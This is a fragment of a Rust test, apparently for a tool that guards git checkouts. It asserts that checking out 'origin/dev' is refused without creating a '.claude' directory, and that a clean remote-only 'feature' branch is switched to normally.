    let home = fx::home(&f);
    fx::git(&f.local, &home, &["fetch", "-q", "origin"]);
    let before = head(&f);
    let (code, v, err) = run_in(&f, &f.local, &["checkout", "origin/dev"]);
    assert_eq!(code, 2, "{err}\n{:#?}", rules(&v));
    assert_eq!(head(&f), before);
    assert!(!f.local.join(".claude").exists());

    // A clean remote-only branch: resolved like git's DWIM and switched to.
    fx::git(&f.pusher, &home, &["checkout", "-q", "-b", "feature", "HEAD~1"]);
    fx::write(&f.pusher, "docs/notes.md", "# notes\n");
    fx::git(&f.pusher, &home, &["add", "-A"]);
    fx::git(&f.pusher, &home, &["commit", "-q", "-m", "notes"]);
    fx::git(&f.pusher, &home, &["push", "-q", "origin", "feature"]);
    fx::git(&f.local, &home, &["fetch", "-q", "origin"]);
    let (code, v, err) = run_in(&f, &f.local, &["checkout", "feature"]);
    assert!(code == 0 || code == 1, "{err}\n{:#?}", rules(&v));
    assert!(f.local.join("docs/notes.md").is_file());
    assert!(!f.marker_exists());
}
